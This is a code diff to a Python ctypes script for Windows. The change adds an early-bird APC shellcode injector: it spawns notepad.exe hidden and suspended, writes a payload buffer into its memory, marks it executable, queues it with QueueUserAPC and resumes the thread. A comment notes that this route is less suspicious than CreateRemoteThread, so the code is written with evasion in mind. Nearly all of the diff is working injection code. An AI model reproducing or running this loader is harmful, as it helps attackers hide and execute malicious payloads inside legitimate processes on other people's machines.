@@ -1,6 +1,6 @@
 from ctypes import *
 from ctypes import wintypes
-import sybprocess
+import subprocess
 
 
 kernel32 = windll.kernel32
@@ -46,7 +46,7 @@ VirtualProtectEx.argtypes=(wintypes.HANDLE, wintypes.LPVOID, SIZE_T, wintypes.DW
 VirtualProtectEx.restype=wintypes.BOOL
 
 #the STARTUPINFO structure in the Windows API is used to specify the window station, desktop, standard handles, and appearance of a new process when it's created
-class STARTUPINFO(ctypes.Structure):
+class STARTUPINFO(Structure):
     _fields_ = [
         ("cb", wintypes.DWORD),
         ("lpReserved", wintypes.LPSTR),
@@ -62,14 +62,14 @@ class STARTUPINFO(ctypes.Structure):
         ("dwFlags", wintypes.DWORD),
         ("wShowWindow", wintypes.WORD),  # Typically a 16-bit value
         ("cbReserved2", wintypes.WORD), # Size in bytes of the reserved area
-        ("lpReserved2", ctypes.POINTER(ctypes.c_ubyte)),
+        ("lpReserved2",POINTER(c_ubyte)),
         ("hStdInput", wintypes.HANDLE),
         ("hStdOutput", wintypes.HANDLE),
         ("hStdError", wintypes.HANDLE)
     ]
 
 #PROCESS_INFORMATION structure is used to get the info of the created process and its primary thread
-class PROCESS_INFORMATION(ctypes.Structure):
+class PROCESS_INFORMATION(Structure):
     _fields_ = [
         ("hProcess", wintypes.HANDLE),
         ("hThread", wintypes.HANDLE),
@@ -128,5 +128,65 @@ CREATE_NEW_CONSOLE = 0x00000010  #process runs through a console
 CREATE_NO_WINDOW   = 0x08000000  #process runniing without a console window
 CREATE_SUSPENDED   = 0x00000004  # the primary thread of the new process is created in a suspended state
 
-created = CreateProcessA(b"C\\Windows\\System32\\notepad.exe", None, None, None, False, CREATE_NEW_CONSOLE, None, None, byref(startup_info), byref(process_info))
-verify(created)
+#creating an hidden process
+created = CreateProcessA(b"C:\\Windows\\System32\\notepad.exe", None, None, None, False, CREATE_NO_WINDOW | CREATE_SUSPENDED, None, None, byref(startup_info), byref(process_info))
+
+if not created:
+    raise WinError()
+
+verify(created)    
+
+pid = process_info.dwProcessId
+h_Thread = process_info.hThread
+Thread_Id = process_info.dwThreadId
+h_Process = process_info.hProcess
+
+print("Started the process => Handle:{}, PID:{}, TID:{}".format(h_Process, pid, Thread_Id))
+
+#allocating the virtual memory
+remote_memory = VirtualAllocEx(h_Process, False, len(buf), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)
+verify(remote_memory)
+print("Memory Allocated => ",hex(remote_memory))
+
+#writing in the remote memory
+write = WriteProcessMemory(h_Process, remote_memory, buf, len(buf), None)
+verify(write)
+print("the bytes written => {}".format(len(buf)))
+
+PAGE_EXECUTE_READ = 0x20
+old_Protection = wintypes.DWORD()
+
+#changing the protectionn condition in the virtual memory
+protect = VirtualProtectEx(h_Process, remote_memory, len(buf), PAGE_EXECUTE_READ, byref(old_Protection))
+verify(protect)
+print("Memory protection updated from the {} to {}".format(old_Protection.value, PAGE_EXECUTE_READ))
+
+#we need to execute this shellcode
+# rThread = CreateRemoteThread(h_Process,None,0, remote_memory,None,EXECUTE_IMMEDIATELY,None)
+# verify(rThread)
+
+PAPCFUNC = CFUNCTYPE(None, POINTER(wintypes.ULONG))
+
+#this is a asynchronous procedure call function like remote thread less suspicious
+QueueUserAPC = kernel32.QueueUserAPC
+QueueUserAPC.argtypes=(PAPCFUNC, wintypes.HANDLE, POINTER(wintypes.ULONG))
+QueueUserAPC.restype = wintypes.BOOL
+
+#to resume the previous suspended thread
+ResumeThread = kernel32.ResumeThread
+ResumeThread.argtypes=(wintypes.HANDLE,)
+ResumeThread.restype = wintypes.BOOL
+
+
+# to load the shell in thread in the remote memory
+rqueue = QueueUserAPC(PAPCFUNC(remote_memory), h_Thread, None)
+if not rqueue:
+    raise WinError()
+verify(rqueue)
+print("Queueing APC thread => {}".format(h_Thread))
+
+#now we have to resume
+rThread = ResumeThread(h_Thread)
+verify(rThread)
+print("Resuming the Thread!!")
+
